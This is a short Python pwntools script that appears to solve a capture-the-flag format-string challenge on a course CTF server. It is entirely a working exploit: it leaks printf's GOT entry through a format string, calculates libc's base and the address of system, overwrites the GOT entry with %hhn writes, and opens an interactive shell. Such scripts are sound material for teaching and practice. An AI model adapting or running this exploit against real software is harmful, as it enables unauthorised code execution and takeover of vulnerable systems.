from pwn import *
import random

r = remote('csie.ctf.tw',10132)
#r = remote('127.0.0.1',8888)
junk = r.recvrepeat(0.1)
print junk

raw_input('pause')

elf = ELF('./fmtstr')

system_off = 0x0003fcd0
#system_off = 0x0003b160
printf_off = 0x0004cc40
#printf_off = 0x0004a130

printf_got = 0x804a010

def fmt(s):
  r.send(s + '\n')
  return r.recvrepeat(0.1)

my_string = fmt(p32(printf_got)+'%4$s')
base = u32(my_string[4:8]) - printf_off
system = base + system_off

p = ''.join(p32(printf_got+i) for i in range(4))

printed = 16
for i in range(3):
  byte = (system >> (i*8)) & 0xff # value of byte[i]
  pad = ((byte-printed) % 256 + 256) %256
  if pad > 0:
    p += '%%%dc' % (pad)
  p += '%%%d$hhn' % (4+i)
  printed += pad
fmt(p)

r.interactive()
